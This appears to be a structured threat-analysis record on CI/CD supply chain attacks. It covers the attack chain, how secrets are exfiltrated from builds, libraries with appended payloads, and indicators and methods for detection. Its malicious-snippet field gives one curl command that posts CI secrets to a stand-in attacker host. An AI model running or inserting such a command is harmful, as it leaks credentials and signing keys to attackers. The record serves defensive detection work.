package_info.why_malicious: This report does not analyze a specific malicious package, but rather discusses systemic risks and attack scenarios in CI/CD pipelines that can lead to software supply chain attacks. The focus is on the risk of malicious code or dependencies being introduced into software via compromised CI/CD infrastructure, credentials, or third-party components. Attackers may leverage unauthorized access to inject malicious code or alter build artifacts, resulting in compromised software being distributed to end users.

execution_context.trigger: CI/CD pipeline execution (build or test stage)
execution_context.file_location: source code repository (e.g., src/, scripts/) or CI/CD configuration files (e.g., .github/workflows/*.yml, Jenkinsfile)
required_permissions: filesystem (read/write access to source and build artifacts)

malicious_snippets.code_snippet:
Malicious code or dependencies are added to source code or build scripts, either directly or via compromised third-party libraries. For example, a build script may include a command such as:

curl -X POST -d @/etc/ci_secrets http://attacker.example.com/exfiltrate

or a dependency update may introduce a package that, when installed, executes code to access environment variables and send them to an external server.
malicious_snippets.code_language: varies (e.g., shell script, Python, JavaScript, YAML for CI/CD configs)
malicious_snippets.code_behavior: During CI/CD pipeline execution, the malicious code reads sensitive environment variables (such as API keys or signing credentials) and transmits them via HTTP POST to an attacker-controlled domain, resulting in unauthorized exfiltration of secrets.

malice_analysis.why_suspicious: Any code or dependency added to the build process without proper review, especially those that access secrets or make outbound network requests, is highly suspicious. Such actions are not typical in standard build scripts and may indicate credential theft or backdoor installation.
malice_analysis.violated_expectations: Normal CI/CD pipelines should only execute reviewed and trusted code. Introducing unreviewed or untrusted code, or code that accesses secrets and communicates externally, violates the principle of least privilege and expected build isolation.
malice_analysis.similar_legitimate_use: Automated dependency updates or build scripts may legitimately access environment variables for configuration, but should never transmit them externally. Legitimate scripts are sourced from trusted repositories and are subject to code review.
key_indicators: Addition of new dependencies from untrusted or unverified sources
Modifications to build scripts or CI/CD configuration files without documented review
Presence of code that reads secrets or environment variables and initiates outbound network connections
Build logs showing unexpected network activity or data exfiltration attempts

execution_context.trigger: runtime (post-deployment, when application or library is loaded/executed)
execution_context.file_location: compiled binary or application package (e.g., standard libraries such as d3dcompiler.dll, ffmpeg, or application executables)
required_permissions: filesystem (read/write access to application files and user data)

malicious_snippets.code_snippet: Malicious code is appended to standard libraries (e.g., d3dcompiler, ffmpeg) or binaries, which is then executed when the application runs. For example, a binary may contain an additional section that, upon execution, launches a hidden process to connect to an external C2 server and transmit user data.
malicious_snippets.code_language: binary (compiled code, e.g., C/C++), or injected scripts (e.g., shellcode, embedded scripts)
malicious_snippets.code_behavior: At runtime, the modified library or binary loads the appended malicious payload, which establishes an outbound connection to an attacker-controlled server and exfiltrates sensitive user data, resulting in compromise of the end-user system.

malice_analysis.why_suspicious: Standard libraries and binaries should match their official, reproducible builds. The presence of appended or hidden code, especially code that initiates network connections or spawns hidden processes, is a hallmark of supply chain compromise.
malice_analysis.violated_expectations: Legitimate libraries and binaries are expected to be identical to their official releases. Any deviation, such as additional sections or unexplained code, violates integrity and trust assumptions.
malice_analysis.similar_legitimate_use: Custom builds for internal use may modify binaries, but such changes are documented, reviewed, and do not include hidden payloads or unauthorized network activity.
key_indicators: Unexpected changes to standard libraries or application binaries (hash mismatch, extra sections)
Presence of appended code or unexplained executable sections in compiled files
Behavioral anomalies during application execution, such as unexpected network connections or spawned processes
Detection of outbound connections to unrecognized domains or IPs from the application

attack_chain.action: Attacker obtains credentials or unauthorized access to CI/CD infrastructure or source code repository, such as through phishing, credential stuffing, or exploiting misconfigurations.
attack_chain.leads_to: Ability to modify code, configuration, or dependencies within the software supply chain.

attack_chain.action: Malicious code or dependencies are introduced into the source code, build scripts, or third-party libraries, enabling execution of unauthorized actions during the build process.
attack_chain.leads_to: Malicious code is included in the build process, potentially accessing secrets or modifying build artifacts.

attack_chain.action: CI/CD pipeline builds and signs the compromised software, which may include modified binaries or libraries with hidden malicious payloads.
attack_chain.leads_to: Compromised software is deployed to production or distributed to end users, embedding the malicious payload.

attack_chain.action: Malicious code executes on end-user systems, establishing outbound connections to attacker infrastructure and exfiltrating data or establishing persistence.
attack_chain.leads_to: Final goal: compromise of end-user environments, data exfiltration, or persistent access for the attacker.

behavioral_signatures: Unexpected outbound network requests during CI/CD builds or from deployed applications
Access to secrets, tokens, or environment variables in build scripts or application code followed by network transmission
Modifications to standard libraries or binaries resulting in hash mismatches or additional executable sections
Addition of new dependencies or code from untrusted or unverified sources in the build process
file_indicators: Changes to CI/CD configuration files (e.g., .github/workflows/*.yml, Jenkinsfile, .gitlab-ci.yml) without documented review
Unexpected modifications to standard libraries (e.g., d3dcompiler.dll, ffmpeg) or application binaries (hash or size changes)
Presence of undocumented or unexplained files or sections in build artifacts or deployment packages
network_indicators: Outbound connections to unknown or suspicious domains or IP addresses during build or runtime (e.g., attacker-controlled endpoints)
Exfiltration of secrets or environment variables to external endpoints via HTTP/S POST or other protocols
Connections to infrastructure not present in official documentation or expected application behavior
detection_knowledge.how_to_detect: Monitor CI/CD pipelines for unauthorized changes to code, configuration, or dependencies using version control and code review enforcement. Implement file integrity monitoring to detect unexpected modifications to standard libraries or binaries by comparing hashes against official releases. Analyze network traffic for suspicious outbound connections during builds and from deployed applications, correlating with known malicious domains or IPs. Use Software Bill of Materials (SBOM) to verify the integrity and provenance of all third-party components. Enforce reproducible builds and perform post-compilation integrity checks to ensure no unauthorized code is present in final artifacts.
